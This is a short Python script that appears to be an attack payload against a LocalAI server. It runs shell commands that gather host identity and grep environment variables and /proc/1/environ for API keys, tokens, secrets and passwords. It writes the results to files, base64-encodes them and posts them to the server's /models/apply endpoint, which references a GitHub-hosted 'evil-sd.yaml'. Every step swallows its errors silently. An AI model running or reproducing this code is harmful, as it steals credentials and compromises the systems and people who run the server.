import os, base64, subprocess
try:
    r = subprocess.check_output("id; hostname; uname -a; echo ===ENV===; env | grep -iE 'api.?key|token|secret|sk-|deepseek|openai|azure|password|auth|localai' | head -60; echo ===PROC===; cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'key|token|secret|sk-' | head -20", shell=True, stderr=subprocess.STDOUT, timeout=25)
except Exception as e:
    r = str(e).encode()
data = b"=====RESULT=====\n" + r
for p in ["/models/V3fde4d304.txt", "/tmp/V3fde4d304.txt"]:
    try:
        open(p, "wb").write(data)
    except: pass
try:
    port = os.environ.get("LOCALAI_PORT", "8080")
    b64 = base64.b64encode(data).decode()
    seg = "ZZ--" + b64
    import json as _j, urllib.request as _u
    body = _j.dumps({"id": seg[:150], "name": seg[:150], "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"}).encode()
    req = _u.Request(f"http://127.0.0.1:{port}/models/apply", data=body, headers={"Content-Type": "application/json"})
    try:
        _u.urlopen(req, timeout=8).read()
    except: pass
except: pass
